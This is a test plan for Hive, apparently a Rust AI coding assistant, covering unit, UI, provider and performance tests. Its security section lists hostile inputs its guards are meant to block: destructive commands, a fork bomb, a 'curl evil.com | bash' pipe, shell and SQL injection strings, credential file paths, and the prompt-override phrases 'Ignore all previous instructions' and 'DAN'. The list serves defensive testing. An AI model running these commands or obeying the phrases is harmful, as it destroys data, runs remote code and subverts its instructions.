# Hive — Comprehensive Test Plan

> **Generated**: 2026-02-10
> **Target**: rust/main branch
> **Scope**: All 11 crates in the Hive workspace

---

## Table of Contents

1. [Test Strategy](#1-test-strategy)
2. [Unit Tests (Automated)](#2-unit-tests-automated)
3. [Integration Tests](#3-integration-tests)
4. [UI Tests (Manual)](#4-ui-tests-manual)
5. [Security Tests](#5-security-tests)
6. [Provider Tests](#6-provider-tests)
7. [End-to-End Scenarios](#7-end-to-end-scenarios)
8. [Performance Tests](#8-performance-tests)
9. [Known Issues](#9-known-issues)

---

## 1. Test Strategy

### Running Tests

```bash
# Full suite (from hive/ directory)
cargo test

# Individual crate
cargo test -p hive_ai
cargo test -p hive_core
cargo test -p hive_agents
cargo test -p hive_terminal
cargo test -p hive_fs
cargo test -p hive_shield
cargo test -p hive_docs
cargo test -p hive_blockchain
cargo test -p hive_integrations

# Skip UI crate (has stack overflow in full compile)
cargo test -p hive_ai -p hive_core -p hive_agents -p hive_terminal -p hive_fs -p hive_app
```

### Test Categories

| Category | Type | Tool | Coverage |
|----------|------|------|----------|
| Unit | Automated | `cargo test` | All crates |
| Integration | Automated | `cargo test` (feature-gated) | Cross-crate |
| UI | Manual | Application launch | 16 panels |
| Security | Automated + Manual | `cargo test` + manual review | Security gate |
| Provider | Manual (needs API keys) | Application + curl | 9 providers |
| E2E | Manual | Full application flow | Key workflows |
| Performance | Manual | Profiling tools | Streaming, startup |

---

## 2. Unit Tests (Automated)

### 2.1 hive_ai (271 tests)

#### Providers

| Test Area | Count | What to Verify |
|-----------|-------|----------------|
| Anthropic SSE parsing | ~47 | Text blocks, thinking blocks, role-only deltas, usage stats, error mapping |
| OpenAI request building | ~15 | Reasoning model handling (max_completion_tokens), temperature skip for o1/o3, stream_options |
| OpenRouter headers | ~11 | HTTP-Referer, X-Title headers, model ID format (org/model) |
| Groq provider | ~11 | API endpoint, bearer auth, OpenAI-compat SSE, model list |
| HuggingFace provider | ~11 | API endpoint, bearer auth, model list, free tier models |
| LiteLLM provider | ~18 | Configurable URL, optional auth, model discovery via /model/info, cost parsing |
| LM Studio provider | ~10 | localhost:1234, no auth, model discovery |
| GenericLocal provider | ~13 | Configurable URL, no auth, fallback default_model |
| openai_sse module | ~4 | SSE line parsing, [DONE] handling, usage accumulation, empty delta skip |

**Run**: `cargo test -p hive_ai -- providers`

#### Routing

| Test Area | Count | What to Verify |
|-----------|-------|----------------|
| ModelRouter explicit routing | ~8 | Prefix matching (claude-*, gpt-*, groq/*, hf/*), OpenRouter fallback |
| ModelRouter auto-routing | ~8 | Complexity classification → tier → fallback chain → model selection |
| AutoFallbackManager | ~17 | Provider status tracking, rate-limit cooldowns, consecutive failures, budget exhaustion, fallback chain ordering |

**Run**: `cargo test -p hive_ai -- routing`

#### Cost Tracking

| Test Area | Count | What to Verify |
|-----------|-------|----------------|
| Token estimation | ~5 | 4 chars/token heuristic, message overhead, conversation framing |
| Cost calculation | ~8 | Model registry lookup, input/output pricing, unknown models |
| Budget tracking | ~10 | Daily/monthly limits, date filtering, per-model breakdown, CSV export |
| CostTracker CRUD | ~8 | Record, total, reset, clear, daily_remaining |

**Run**: `cargo test -p hive_ai -- cost`

#### Service

| Test Area | Count | What to Verify |
|-----------|-------|----------------|
| Provider registration | ~5 | Cloud providers skip in privacy mode, local always registered |
| Privacy mode | ~3 | Cloud providers excluded, local providers remain |
| Config update | ~3 | Re-registration on config change |
| Stream preparation | ~3 | prepare_stream returns provider + request without awaiting |

**Run**: `cargo test -p hive_ai -- service`

---

### 2.2 hive_core (~200 tests)

| Test Area | What to Verify |
|-----------|----------------|
| HiveConfig | Default values, serialization round-trip, field access |
| ConfigManager | Load, save, update, reload, migration from ~/.hivecode/ |
| SecurityGateway commands | Block rm -rf, format, shutdown, fork bomb, curl\|bash, eval |
| SecurityGateway URLs | HTTPS required, private IP blocking, localhost blocking |
| SecurityGateway paths | System root blocking, sensitive dir blocking, traversal blocking |
| SecurityGateway injection | SQL injection patterns, shell injection patterns |
| SecureStorage | Encrypt/decrypt round-trip, key listing, deletion, salt uniqueness |
| Database | Table creation, CRUD operations, conversation storage |
| ConversationStore | Create, list, search, update title/model, message storage |
| NotificationStore | Create, read/unread toggle, priority filtering, bulk operations |
| SessionState | Save/load, panel persistence, window geometry |
| CronScheduler | Cron expression parsing, next-run calculation |
| ErrorHandler | Error type creation, recovery suggestions |
| Kanban | Board/column/card CRUD, column ordering |

**Run**: `cargo test -p hive_core`

---

### 2.3 hive_agents (~869 tests)

| Test Area | What to Verify |
|-----------|----------------|
| HiveMind orchestration | Role selection, sequential execution, cost tracking, time limits |
| HiveMind consensus | Keyword overlap calculation, threshold checking |
| Coordinator planning | AI task decomposition, dependency validation, cycle detection |
| Coordinator execution | Wave ordering, persona delegation, result collection |
| Persona registry | Built-in persona lookup, custom registration, case-insensitive search |
| Guardian agent | 11 issue categories (harmful content, data leak, injection, etc.) |
| Skill registry | Registration, dispatch, injection scanning (SHA-256 integrity) |
| Skill marketplace | Installation, security scanning, version tracking |
| Tool use | ToolCall parsing, ToolResult building, handler dispatch |
| Auto-commit | Commit message sanitization, SecurityGateway validation, branch creation |
| HiveLoop | Iteration limits, cost limits, time limits, completion detection, checkpoint/restore |
| Automation | Trigger matching, action execution, workflow lifecycle |
| Persistence | Snapshot save/load, cleanup by age, JSON format |
| Heartbeat | Timeout detection, liveness tracking |
| Standup | Report generation, history tracking |
| MCP client | JSON-RPC request/response, tool discovery |
| MCP server | Tool registration, request handling |
| Voice | Wake word matching, intent classification |
| Specs | CRUD, auto-update, version bumping, markdown export |

**Run**: `cargo test -p hive_agents`

---

### 2.4 hive_terminal (191 tests)

| Test Area | Count | What to Verify |
|-----------|-------|----------------|
| CommandExecutor | 29 | SecurityGateway integration, timeout enforcement, working dir validation, output truncation |
| CLI service | 47 | Command registration, aliases, arguments, help generation, doctor checks |
| Interactive shell | 15 | Platform detection, dimensions, write+read echo, kill, serialization |
| Browser automation | 34 | Pool management, acquire/release, actions, idle cleanup |
| Docker sandbox | 55 | Lifecycle transitions, invalid transitions, exec, listing, cleanup |
| Local AI detection | 11 | Probe parsing, default endpoints, Ollama manager |

**Run**: `cargo test -p hive_terminal`

---

### 2.5 hive_fs (~50 tests)

| Test Area | What to Verify |
|-----------|----------------|
| FileService read | Read UTF-8 files, 10MB limit enforcement, missing file error |
| FileService write | Write with parent dir creation, content verification |
| FileService security | System root rejection, sensitive dir blocking, path traversal |
| GitService | Open/init repo, status, diff, stage, unstage, commit |
| SearchService | Regex search, case sensitivity, glob filtering, max results, binary skip |
| FileWatcher | Create/modify/delete/rename events, recursive watching |

**Run**: `cargo test -p hive_fs`

---

### 2.6 hive_shield (~40 tests)

| Test Area | What to Verify |
|-----------|----------------|
| PII detection | Email, phone, SSN, credit card, IP address pattern matching |
| PII cloaking | Placeholder format, hash format, redact format, cloak map |
| Secret scanning | AWS keys, GitHub tokens, private keys, DB URLs, JWT |
| Vulnerability assessment | Injection patterns, jailbreak patterns, exfiltration patterns |
| Access control | Data classification levels, provider trust levels, policy enforcement |
| Shield pipeline | 4-stage ordering, Block/CloakAndAllow/Allow decisions |

**Run**: `cargo test -p hive_shield`

---

### 2.7 Other Crates

| Crate | Tests | Run Command |
|-------|-------|-------------|
| hive_docs | Unknown | `cargo test -p hive_docs` |
| hive_blockchain | Unknown | `cargo test -p hive_blockchain` |
| hive_integrations | Unknown | `cargo test -p hive_integrations` |
| hive_app | ~10 | `cargo test -p hive_app` |

---

## 3. Integration Tests

### 3.1 Config → AI Service Flow

| # | Test | Steps | Expected |
|---|------|-------|----------|
| 1 | Config propagation | Set API keys in HiveConfig → Create AiServiceConfig → Init AiService | Correct providers registered |
| 2 | Privacy mode propagation | Enable privacy_mode in HiveConfig → Init AiService | Only local providers available |
| 3 | Config hot-reload | Update config via ConfigManager → Check AiService state | Providers re-registered |

### 3.2 Routing → Provider Flow

| # | Test | Steps | Expected |
|---|------|-------|----------|
| 1 | Explicit model routing | Request with `claude-sonnet-4-5` → ModelRouter | Routes to Anthropic |
| 2 | Auto-routing simple | Simple question → ComplexityClassifier → ModelRouter | Routes to Budget/Free tier |
| 3 | Auto-routing complex | Architecture question → ComplexityClassifier | Routes to Premium tier |
| 4 | Fallback on failure | Mark provider unavailable → Request | Routes to next in chain |
| 5 | OpenRouter proxy | Mark Anthropic down → Request claude model | Routes via OpenRouter |

### 3.3 Agent → AI Flow

| # | Test | Steps | Expected |
|---|------|-------|----------|
| 1 | HiveMind execution | Submit task → HiveMind decompose → Agent execution | Roles selected, sequential execution, cost tracked |
| 2 | Coordinator planning | Submit spec → AI decomposition → Wave execution | Dependencies respected, all tasks complete |
| 3 | Guardian validation | Generate AI output → Guardian scan | Issues detected and categorized |

### 3.4 Shield → AI Flow

| # | Test | Steps | Expected |
|---|------|-------|----------|
| 1 | PII cloaking | Text with email + SSN → Shield pipeline → Send to provider | PII replaced before sending |
| 2 | Secret blocking | Text with API key → Shield pipeline | Blocked, not sent |
| 3 | Injection blocking | Prompt with "ignore all previous" → Shield | Blocked as injection attempt |

---

## 4. UI Tests (Manual)

### 4.1 Application Launch

| # | Test | Steps | Expected |
|---|------|-------|----------|
| 1 | Cold start | Launch hive.exe | Window opens (1280x800), tray icon appears, no errors |
| 2 | Session restore | Close app → Relaunch | Same panel and conversation restored |
| 3 | Missing config | Delete ~/.hive/ → Launch | Creates default config, starts normally |
| 4 | Tray icon | Right-click tray icon | Menu shows: Show Window, New Chat, Toggle Privacy, Settings, Quit |
| 5 | Tray → show | Click "Show Window" from tray | Window comes to foreground |

### 4.2 Chat Panel

| # | Test | Steps | Expected |
|---|------|-------|----------|
| 1 | Send message | Type text → Press Enter | Message appears as user bubble, AI response streams in |
| 2 | Shift+Enter | Press Shift+Enter in input | Newline inserted, message NOT sent |
| 3 | Markdown rendering | AI responds with markdown | Headings, bold, italic, lists rendered correctly |
| 4 | Code blocks | AI responds with ```rust code | Language badge, copy button, monospace font |
| 5 | Copy code | Click "Copy" on code block | Code copied to clipboard |
| 6 | Streaming indicator | During AI response | Cyan border, "Generating..." label, live content |
| 7 | Thinking section | Use model with thinking (Opus) | Collapsible thinking block appears |
| 8 | Model badge | After AI response | Shows model name + tier (Budget/Mid/Premium) |
| 9 | Cost badge | After AI response | Shows cost in USD + token count |
| 10 | New conversation | Press Ctrl+N | Chat cleared, new conversation started |
| 11 | Clear chat | Press Ctrl+L | Messages cleared |
| 12 | Welcome screen | New conversation, no messages | Branding/welcome message shown |
| 13 | Error display | Send with no API keys configured | Error message in red bubble |

### 4.3 Settings Panel

| # | Test | Steps | Expected |
|---|------|-------|----------|
| 1 | Navigate | Click Settings icon or Ctrl+, | Settings panel opens |
| 2 | API key entry | Type API key → Click away (blur) | Key saved, green dot appears |
| 3 | API key masking | Enter key | Characters masked (dots/asterisks) |
| 4 | Empty key preserved | Clear key field → Blur | Existing key NOT overwritten |
| 5 | Ollama URL | Change to custom URL → Blur | Saved, used for next request |
| 6 | Privacy mode | Toggle ON | Cloud providers disabled, local only |
| 7 | Default model | Select from dropdown | Saved, used for next chat |
| 8 | Auto routing | Toggle ON/OFF | Affects model selection behavior |
| 9 | Budget limits | Set daily=$5 → Blur | Saved, enforced on requests |
| 10 | Settings badge | Open settings | Shows "X/4 configured" API keys |

### 4.4 History Panel

| # | Test | Steps | Expected |
|---|------|-------|----------|
| 1 | Navigate | Click History icon or Ctrl+2 | History panel opens |
| 2 | Conversation list | Have 3+ conversations | Cards with title, time, count, model, preview |
| 3 | Search | Type in search bar | Filters by title, model, or preview |
| 4 | Load conversation | Click a card | Conversation loaded in Chat panel |
| 5 | Delete conversation | Click trash icon on card | Conversation removed, list refreshes |
| 6 | Refresh | Click refresh button | List reloads from disk |
| 7 | Relative timestamps | Check conversation times | "Just now", "5 minutes ago", "Yesterday", etc. |
| 8 | Empty state | No conversations | Calendar icon + "No conversations yet" |

### 4.5 Files Panel

| # | Test | Steps | Expected |
|---|------|-------|----------|
| 1 | Navigate | Click Files icon or Ctrl+3 | Files panel opens |
| 2 | Directory listing | Browse to project directory | Files and folders listed, sorted (dirs first) |
| 3 | Navigate into folder | Click folder | Contents shown, breadcrumbs update |
| 4 | Navigate back | Click back button or Backspace | Returns to parent |
| 5 | Breadcrumbs | Click path segment | Navigates to that directory |
| 6 | Search | Type in search bar | Filters files by name (case-insensitive) |
| 7 | Open file | Click open button on file | Opens in system default app |
| 8 | New file | Click "New File" | Creates untitled.txt |
| 9 | New folder | Click "New Folder" | Creates new_folder |
| 10 | Delete | Click trash icon | File/folder deleted |
| 11 | File icons | Various file types | Correct emoji icons (.rs=brain, .py=snake, etc.) |
| 12 | Stats footer | View bottom of panel | "X items, Y folders, Z files" |

### 4.6 Kanban Panel

| # | Test | Steps | Expected |
|---|------|-------|----------|
| 1 | Navigate | Click Kanban icon or Ctrl+6 | Kanban board opens |
| 2 | Columns | View board | Todo, In Progress, Done columns |
| 3 | Add task | Press Ctrl+K or click Add | New task card in Todo |
| 4 | Task cards | View a card | Title, description, priority, timestamp |

### 4.7 Costs Panel

| # | Test | Steps | Expected |
|---|------|-------|----------|
| 1 | Navigate | Click Costs icon or Ctrl+9 | Cost dashboard opens |
| 2 | Today's cost | After some API calls | Current day's spend shown |
| 3 | Monthly cost | After some API calls | Current month total shown |
| 4 | Budget bars | Set budget in settings | Visual progress bars |
| 5 | Per-model breakdown | Multiple models used | Cost breakdown by model |
| 6 | Export CSV | Press Ctrl+E | CSV file downloaded |
| 7 | Reset today | Press Ctrl+R | Today's costs cleared |

### 4.8 Other Panels

| Panel | Test | Expected |
|-------|------|----------|
| Logs | Filter by level | Only selected level+ shown |
| Logs | Clear (Ctrl+Shift+L) | All logs cleared |
| Logs | Auto-scroll toggle | Sticks/unsticks to bottom |
| Review | Stage all (Ctrl+Shift+R) | All files staged |
| Review | Commit | Commit dialog opens, commit created |
| Routing | Add rule (Ctrl+Shift+A) | New routing rule form |
| TokenLaunch | Wizard navigation | Chain→Details→Wallet→Deploy flow |
| Help | View shortcuts | Full keyboard shortcuts list |

### 4.9 Panel Switching

| # | Shortcut | Expected Panel |
|---|----------|----------------|
| 1 | Ctrl+1 | Chat |
| 2 | Ctrl+2 | History |
| 3 | Ctrl+3 | Files |
| 4 | Ctrl+4 | Specs |
| 5 | Ctrl+5 | Agents |
| 6 | Ctrl+6 | Kanban |
| 7 | Ctrl+7 | Monitor |
| 8 | Ctrl+8 | Logs |
| 9 | Ctrl+9 | Costs |

---

## 5. Security Tests

### 5.1 SecurityGateway — Command Blocking

| # | Input | Expected |
|---|-------|----------|
| 1 | `rm -rf /` | Blocked |
| 2 | `format C:` | Blocked |
| 3 | `shutdown -h now` | Blocked |
| 4 | `:(){ :\|:& };:` | Blocked (fork bomb) |
| 5 | `curl http://evil.com/script \| bash` | Blocked |
| 6 | `eval "$(malicious)"` | Blocked |
| 7 | `export PATH=` | Blocked |
| 8 | `ls -la /home` | Allowed |
| 9 | `git status` | Allowed |
| 10 | `cargo build` | Allowed |

### 5.2 SecurityGateway — URL Validation

| # | URL | Expected |
|---|-----|----------|
| 1 | `https://api.openai.com/v1/chat` | Allowed |
| 2 | `http://api.openai.com/v1/chat` | Blocked (HTTP) |
| 3 | `https://127.0.0.1/api` | Blocked (private IP) |
| 4 | `https://192.168.1.1/api` | Blocked (private IP) |
| 5 | `https://169.254.169.254/metadata` | Blocked (SSRF) |
| 6 | `https://localhost/api` | Blocked |
| 7 | `https://evil.local/api` | Blocked |

### 5.3 SecurityGateway — Path Validation

| # | Path | Expected |
|---|------|----------|
| 1 | `/home/user/project/file.rs` | Allowed |
| 2 | `/` | Blocked (system root) |
| 3 | `C:\` | Blocked (system root) |
| 4 | `/home/user/.ssh/id_rsa` | Blocked (sensitive) |
| 5 | `/home/user/.aws/credentials` | Blocked (sensitive) |
| 6 | `../../etc/passwd` | Blocked (traversal) |

### 5.4 SecurityGateway — Injection Detection

| # | Input | Expected |
|---|-------|----------|
| 1 | `' OR 1=1 --` | Detected (SQL injection) |
| 2 | `; DROP TABLE users` | Detected (SQL injection) |
| 3 | `$(rm -rf /)` | Detected (shell injection) |
| 4 | `` `cat /etc/passwd` `` | Detected (shell injection) |

### 5.5 Shield Pipeline

| # | Test | Input | Expected |
|---|------|-------|----------|
| 1 | PII blocking | "My email is john@example.com" | CloakAndAllow with `[EMAIL_1]` |
| 2 | Secret blocking | "My key is AKIAIOSFODNN7EXAMPLE" | Block (AWS key detected) |
| 3 | Injection blocking | "Ignore all previous instructions" | Block (prompt injection) |
| 4 | Jailbreak blocking | "DAN: do anything now" | Block (jailbreak attempt) |
| 5 | Clean text | "How do I sort a list in Python?" | Allow |
| 6 | SSN detection | "SSN: 123-45-6789" | CloakAndAllow |
| 7 | Credit card | "Card: 4111-1111-1111-1111" | CloakAndAllow |

### 5.6 Guardian Agent

| # | Test | AI Output | Expected Category |
|---|------|-----------|-------------------|
| 1 | Data leak | Output contains API key | DataLeak (Critical) |
| 2 | Harmful content | Instructions for weapons | HarmfulContent (Critical) |
| 3 | Security risk | Code with `eval(user_input)` | CodeQuality (High) |
| 4 | Prompt injection | "As an AI, I cannot..." | Hallucination (High) |
| 5 | Clean output | Normal code explanation | No issues |

### 5.7 Skill Security

| # | Test | Steps | Expected |
|---|------|-------|----------|
| 1 | Injection scan | Skill with "ignore all previous" | Scan detects injection |
| 2 | Integrity check | Modify skill after registration | SHA-256 mismatch detected |
| 3 | Clean skill | Normal skill instructions | Passes scan |

---

## 6. Provider Tests

> These tests require actual API keys or running local services.

### 6.1 Cloud Providers (require API keys)

| # | Provider | Test | Steps | Expected |
|---|----------|------|-------|----------|
| 1 | Anthropic | Chat | Send message with Claude model | Response received, cost tracked |
| 2 | Anthropic | Stream | Send message, observe streaming | Chunks received via SSE, final usage stats |
| 3 | Anthropic | Thinking | Use Opus model | Thinking blocks received |
| 4 | OpenAI | Chat | Send message with GPT-4o | Response received |
| 5 | OpenAI | Reasoning | Use o1/o3 model | max_completion_tokens used, no temperature |
| 6 | OpenRouter | Chat | Send with org/model format | Routed correctly, response received |
| 7 | Groq | Chat | Send message | Ultra-fast response from LPU |
| 8 | Groq | Models | List available models | 4+ models returned |
| 9 | HuggingFace | Chat | Send message | Response from HF Inference API |
| 10 | HuggingFace | Free model | Use Phi-3 Mini | Free tier works without payment |

### 6.2 Local Providers (require running services)

| # | Provider | Prerequisite | Test | Expected |
|---|----------|-------------|------|----------|
| 1 | Ollama | Ollama running on :11434 | `is_available()` | Returns true |
| 2 | Ollama | Model pulled | Chat request | Response in NDJSON format |
| 3 | Ollama | Multiple models | `get_models()` | All local models listed |
| 4 | LM Studio | LM Studio running on :1234 | `is_available()` | Returns true |
| 5 | LM Studio | Model loaded | Chat + stream | OpenAI-compat SSE works |
| 6 | LiteLLM | LiteLLM proxy running | `get_models()` | Models from /model/info |
| 7 | LiteLLM | Proxy configured | Chat request | Proxied to backend |
| 8 | GenericLocal | Any OpenAI-compat server | Chat | Response received |

### 6.3 Provider Availability

| # | Test | Steps | Expected |
|---|------|-------|----------|
| 1 | No API key | Don't configure Anthropic key | Provider not registered |
| 2 | Invalid key | Set wrong API key | `InvalidKey` error on request |
| 3 | Rate limit | Trigger 429 | `RateLimit` error, cooldown applied |
| 4 | Timeout | Set 1ms timeout | `Timeout` error |
| 5 | Privacy mode | Enable privacy | Cloud providers gone, local remain |

---

## 7. End-to-End Scenarios

### 7.1 New User Setup

| Step | Action | Expected |
|------|--------|----------|
| 1 | Launch app first time | Default config created at ~/.hive/ |
| 2 | Go to Settings | "0/4 configured" badge |
| 3 | Enter Anthropic API key | Green dot appears, "1/4 configured" |
| 4 | Go to Chat | Model selector shows Anthropic models |
| 5 | Send first message | Response streams in, cost tracked |
| 6 | Check Costs panel | Today's cost shows the request |

### 7.2 Multi-Provider Workflow

| Step | Action | Expected |
|------|--------|----------|
| 1 | Configure Anthropic + OpenAI + Groq | 3 providers registered |
| 2 | Enable auto-routing | Router uses complexity classifier |
| 3 | Ask simple question | Routes to Budget tier (Groq/Haiku) |
| 4 | Ask architecture question | Routes to Premium tier (Opus) |
| 5 | Check costs | Different costs per tier |

### 7.3 Privacy Mode Workflow

| Step | Action | Expected |
|------|--------|----------|
| 1 | Start Ollama locally | Ollama running on :11434 |
| 2 | Enable privacy mode in Settings | Cloud providers disappear |
| 3 | Send message | Routes to Ollama (local) |
| 4 | Check model selector | Only local models shown |
| 5 | Disable privacy mode | Cloud providers return |

### 7.4 Fallback Workflow

| Step | Action | Expected |
|------|--------|----------|
| 1 | Configure Anthropic + OpenRouter | Both available |
| 2 | Send request to Anthropic | Success, response received |
| 3 | Simulate Anthropic rate limit | 429 error |
| 4 | Send another request | Auto-falls back to OpenRouter |
| 5 | Wait 60s (cooldown) | Anthropic available again |

### 7.5 File Browser Workflow

| Step | Action | Expected |
|------|--------|----------|
| 1 | Go to Files panel | Current directory shown |
| 2 | Navigate into src/ | Source files listed |
| 3 | Search for ".rs" | Only Rust files shown |
| 4 | Click open on a file | Opens in system editor |
| 5 | Create new file | untitled.txt appears |
| 6 | Delete the file | File removed, list refreshed |

### 7.6 Conversation Persistence

| Step | Action | Expected |
|------|--------|----------|
| 1 | Start new conversation | Empty chat |
| 2 | Send 3 messages | Conversation with 6 messages (3 user + 3 assistant) |
| 3 | Close application | Session saved |
| 4 | Relaunch | Same conversation restored, same panel |
| 5 | Go to History | Conversation appears in list |
| 6 | Start new conversation | Previous preserved in history |

### 7.7 Budget Enforcement

| Step | Action | Expected |
|------|--------|----------|
| 1 | Set daily budget to $0.01 | Budget saved |
| 2 | Send expensive request | Cost recorded, approaching limit |
| 3 | Send another request | Budget exceeded warning/block |
| 4 | Check Costs panel | Progress bar at 100%+ |

---

## 8. Performance Tests

### 8.1 Startup Time

| # | Test | Target | How to Measure |
|---|------|--------|----------------|
| 1 | Cold start | <2s to window visible | Stopwatch from exe launch |
| 2 | Config load | <100ms | Tracing logs |
| 3 | Database init | <200ms | Tracing logs |

### 8.2 Streaming Performance

| # | Test | Target | How to Measure |
|---|------|--------|----------------|
| 1 | First token | <500ms after send | Visual observation |
| 2 | UI responsiveness during stream | No freezes | Interact with UI while streaming |
| 3 | Throttled updates | 15fps (67ms) | Check CPU usage during stream |
| 4 | Long response | 10K+ tokens without crash | Send complex request |

### 8.3 Memory Usage

| # | Test | Target | How to Measure |
|---|------|--------|----------------|
| 1 | Idle memory | <100MB | Task Manager |
| 2 | After 10 conversations | <200MB | Task Manager |
| 3 | Large file browser | <300MB for 10K+ files | Navigate to large directory |

### 8.4 File Operations

| # | Test | Target | How to Measure |
|---|------|--------|----------------|
| 1 | File read (1MB) | <100ms | Tracing logs |
| 2 | Directory listing (1000 files) | <500ms | Visual responsiveness |
| 3 | Search (10K files) | <5s | Visual responsiveness |

---

## 9. Known Issues

| # | Issue | Severity | Workaround |
|---|-------|----------|------------|
| 1 | `cargo test` full suite stack overflow in hive_ui | Medium | Test crates individually: `cargo test -p hive_ai -p hive_core ...` |
| 2 | rust-analyzer proc-macro crashes | Low | False positives, compilation works fine |
| 3 | Browser automation is simulation only | Low | Data structures ready, no real CDP/WebDriver |
| 4 | Docker sandbox is simulation only | Low | Data structures ready, no real Docker daemon |
| 5 | hive_ui tests may fail due to GPUI stack depth | Medium | Test individually or skip UI tests |

---

## Appendix: Quick Verification Checklist

After any code change, run this minimum verification:

```bash
cd hive/

# 1. Build check (zero warnings)
cargo check 2>&1 | tail -5

# 2. Core tests
cargo test -p hive_ai -p hive_core -p hive_agents

# 3. Supporting crate tests
cargo test -p hive_terminal -p hive_fs -p hive_app

# 4. Security crate
cargo test -p hive_shield

# Expected: All tests pass, 0 warnings
```

For UI changes, also launch the application and manually verify the affected panel.
